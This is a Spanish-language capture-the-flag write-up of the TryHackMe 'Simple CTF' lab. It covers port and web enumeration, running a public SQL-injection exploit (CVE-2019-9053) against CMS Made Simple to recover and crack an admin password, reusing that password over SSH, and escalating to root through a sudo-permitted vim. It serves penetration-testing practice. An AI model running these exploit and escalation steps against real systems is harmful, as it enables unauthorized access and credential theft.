---
layout: post
title: Tryhackme - Simple CTF
autor: S3cureroy
date: 2022-03-02
categories: [CTF, Tryhackme]
tags: [ exploit , simple cms , web , robots.txt , vim , CVE-2019-9053]
---

La máquina "Simple CTF" es una máquina sencilla que permite practicar técnicas de pentesting WEB, enumerando ficheros conocidos de los servidores, como *robots.txt*, además de ganar acceso inicial mediante vulnerabilidades conocidas.

## Enumeración. ## 

Lo primero que se debe hacer al obtener la IP de la máquina, es lanzar un escaneo de puertos que permita ver que servicios tiene expuestos, y por tanto son atacables.

Lanzando un comando nmap con los parámetros para mostrar las versiones de los servicios y lanzar los comandos *nse* de enumeración de dichos servicios.

~~~console
Starting Nmap 7.70 ( https://nmap.org ) at 2021-03-20 09:16 CET
Nmap scan report for 10.10.124.34
Host is up (0.039s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.71.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%), Linux 2.6.32 - 3.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   34.77 ms 10.9.0.1
2   35.06 ms 10.10.124.34

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.40 seconds
~~~

Como se puede ver, los puertos abiertos son el *21*, correspondiente a FTP, el *80*, correspondiente al protocolo HTTP y se puede observar, que el protocolo SSH, que por defecto suele tener configurado el puerto 22, en esta ocasión dispone del puerto *2222*.


## Enumeración WEB. ##

Obtenidos los puertos abiertos, se puede empezar por el deseado, en esta ocasión, se decide obtener los ficheros y directorios que están expuestos en la web, lo que generalmente se conoce como *fuzzing*.

Uno de los ficheros más usados para enumerar recursos, es el fichero *robots.txt* usado para que los buscadores como Google, DuckDuckgo, Bing, etc. no indexen ciertas páginas web y por tanto no salgan en sus listados al realizar búsquedas. 

En este fichero *robots* se puede observar el directorio */openemr-5_0_1_3* pero al intentar acceder, la respuesta del servidor, es un código 404 (no encontrado).

~~~console
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
~~~

> Existen otros ficheros que crean algunos CMS que puede ser usados por los atacantes para obtener cierta información que puede ser importante para el ataque, como **README.md**, **VERSION.md**, etc.
{: .prompt-info }

Se utiliza entonces, una aplicación escrita en python3, llamada **dirsearch** que sirve para automatizar la tarea de enumeración de recursos y obtener ficheros importantes, o incluso directorios donde pueden alojarse otros ficheros.

Se obtiene un recurso llamado **/simple**, que puede ser importante.

~~~console
[09:22:26] Starting: 
[09:22:29] 403 -  300B  - /.htaccess-dev
[09:22:29] 403 -  302B  - /.htaccess-local
[09:22:29] 403 -  302B  - /.htaccess-marco
[09:22:29] 403 -  301B  - /.htaccess.bak1
[09:22:29] 403 -  300B  - /.htaccess.old
[09:22:29] 403 -  301B  - /.htaccess.orig
[09:22:29] 403 -  303B  - /.htaccess.sample
[09:22:29] 403 -  301B  - /.htaccess.save
[09:22:29] 403 -  300B  - /.htaccess.txt
[09:22:29] 403 -  299B  - /.htaccessBAK
[09:22:29] 403 -  300B  - /.htaccessOLD2
[09:22:29] 403 -  299B  - /.htaccessOLD
[09:22:29] 403 -  300B  - /.htpasswd-old
[09:22:29] 403 -  298B  - /.httr-oauth
[09:22:30] 403 -  291B  - /.php
[09:22:32] 200 -   11KB - /
[09:22:44] 200 -   11KB - /index.html[09:22:50] 200 -  929B  - /robots.txt
[09:22:51] 403 -  300B  - /server-status
[09:22:51] 403 -  301B  - /server-status/
[09:22:51] 301 -  313B  - /simple  ->  http://10.10.124.34/simple/

Task Completed
~~~


Se accede al recurso **/simple**, obteniendo la parte frontal de un cms llamado **Simple CMS**.

![](https://i.imgur.com/kGbBZOJ.png)

En la página inicial hay 3 datos curiosos.

* Dice que la página de administración se encuentra en la ruta **/cmsmspath/admin** a la que se accede correctamente, mostrando un formulario de acceso.
  
![](https://i.imgur.com/iAhgqXo.png)

* La versión del cms, que es la 2.2.8 de CMS Made Simple aparece en uno de los footer, por tanto se pueden buscar vulnerabilidades conocidas.
* Se han instalado módulos adicionales, y si se conocen dichos módulos se pueden buscar vulnerabilidades conocidas.

## Explotación. ##

Sabiendo que versión es, se buscan exploit en searchexploit, encontrando una que puede servir, de inyección SQL, con el código de vulnerabilidad asignado **[CVE-2019-9053](https://www.exploit-db.com/exploits/46635)**.

~~~console
searchsploit 46635.py  
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                 | php/webapps/46635.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
~~~

Se obtiene el exploit, que está escrito en python y se lanza obteniendo los siguientes datos de acceso.

~~~console
python 46635.py -c -u http://10.10.124.34/simple -w darkc0de.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
~~~

Mediante estas credenciales, se puede acceder a la parte de administración vista previamente, pero no se consigue obtener ejecución de código, y se busca si las credenciales pueden haber sido recicladas en otro servicio, obteniendo acceso mediante SSH.


Se obtiene el flag de usuario (**user.txt = G00d j0b, keep up!**).


## Escalada de privilegios. ##

Se comienza entonces a enumerar posibles vectores de para escalar privilegios.

Se comienza a buscar con el comando **find** los binarios con suid, pero no se encuentra ninguno que pueda se explotable en [GTFOBins](https://gtfobins.github.io/).

~~~console
find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/fusermount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
~~~

Entonces se decide verificar que comandos pueden ser ejecutados con sudo por el usuario.

~~~console
$ sudo -l 
User mitch may run the following commands on Machine:
      (root) NOPASSWD: /usr/bin/vim
~~~

Para explotar vim y obtener una shell como root se debe abrir el editor de texto y ejecutar el comando interno ```:explore```.

~~~console
sudo vim

:explore
~~~

Aunque en ocasiones este método no funciona, y se debe ejecutar el comando mediante el parámetro **-c** en la ejecución, como se puede ver en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) y se obtiene la shell solicitada con permisos de root.

![](https://i.imgur.com/Yh2jyrc.png)

Se puede obtener entonces la flag del usuario root (**W3ll d0n3. You made it!**) habiendo comprometido la máquina completamente.
